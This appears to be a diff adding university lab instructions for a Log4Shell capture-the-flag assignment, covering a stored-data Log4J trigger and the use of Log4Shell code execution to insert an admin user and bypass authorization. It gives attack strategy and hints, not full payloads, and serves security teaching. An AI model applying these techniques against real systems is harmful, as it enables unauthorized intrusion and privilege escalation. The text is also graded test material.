+We’ve explored introducing malicious strings to be triggered by the application as it accepts and processes an HTTP request. For this flag we’re going to explore an often overlooked attack vector for exploits like Log4J: Data at Rest.
+
+Data at Rest is data that has already been persisted to some data store and is sitting idle. In the case of log4shell, this could be data that is structured in such a way that when the application retrieves and attempts to use or log it, it triggers the LDAP call.
+
+Use the product POST endpoint to persist a record to the database that, when retrieved later, will trigger the LDAP call. You will have to inspect the logs of each of the endpoints to come up with a successful attack strategy.
+
+You will use the log4j exploit to update the “config.properties” file saved in the root directory of the application similar to what you did in Flag 3 and Flag 5. You will write a new property product.id that should have the value set to the id of the malicious product record that you have created/updated.
+
+When the application fetches the record upon calling the right GET endpoint, it will trigger the exploit and, if successful, will generate the Flag 6 message in the logs.
+
+Note: You will have to trigger the LDAP call with the malicious record in order to generate the Flag.
+
+Upon success, you should see your output similar to that below: Log file showing INFO messages from ProductService.java, with a flag revealed
+
+*** **IF THIS FLAG COMES OUT BLANK, Restart container by running the stopContainer and startContainer scripts in the home directory of the log4j user. *****
+
+Back to top
+
+Disclaimer: You are responsible for the information on this website. The content is subject to change at any time. © 2024 Georgia Institute of Technology. All rights reserved.
+
+
+
+
+FLAG 7 (Extra Credit): SQL Attack Authorization Persuasion (2 Pts)
+Make sure you have gone through the Setup and Intro sections.
+
+If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:
+
+  ./StartContainer.sh
+
+The endpoint for this exploit can be called and inspected via:
+
+curl -X "DELETE" 'http://localhost:8080/rest/users/user/<id>' -H "GATECH_ID:123" -H "X-NetworkUserId:MWAD10"
+
+This endpoint is used to delete users from the system database. Only users with admin access (ADMIN_YN = ‘Y’) are allowed to perform this task. You can call the list of users (/users/all) to experiment with this.
+
+In this flag, you will use what you have learned and do something much more nefarious than the previous flags. You will need to use the log4shell exploit to execute an SQL attack and insert a user into the database, such that when the application authorizes the user it returns true and allows a delete.
+
+The userName you must use is EDBOY, you must set the userRole to HOW_DARE_YOU_MOCK_THE_SON_OF_A_SHEPHERD and you must set adminYN to Y to achieve this flag.
+
+Everything you need to achieve this task is logged in one of the 2 log files somewhere. Dissect the log file thoroughly as you will need to do more than just “inject” an sql string. Keep in mind that log4shell does not allow you to interact with the program’s state itself, only execute arbitrary code at the level of access the vulnerable program itself is running on. This means that this will not be a typical SQLi attack where you are exploiting the applications’ queries via injection. In fact, you will not actually interact with the applications sql queries at all. You will need to think outside of the box on how to do this .
+
+Upon success, you should see your output similar to that below: Log file showing TRACE from BasicBinder.java binding a parameter as VARCHAR, INFO from RequestInterceptor.java revealing the flag, and DEBUG from SqlStatementLogger.java displaying an SQL SELECT statement
+
+Hint: Look in the logs for information on the database, the schema, and what could be useful for this attack. You will not need anything outside of the java standard library for this attack.
+
+Hint 2: You will need to leverage one of the previous flags’ curls to get the keys to unlock this flag.
+
+Your flag could be invalid if you have not sent your GATECH_ID appropriately in the published message. *** **IF THIS FLAG COMES OUT BLANK, Restart container by running the stopContainer and startContainer scripts in the home directory of the log4j user. *****
+
+
+
+
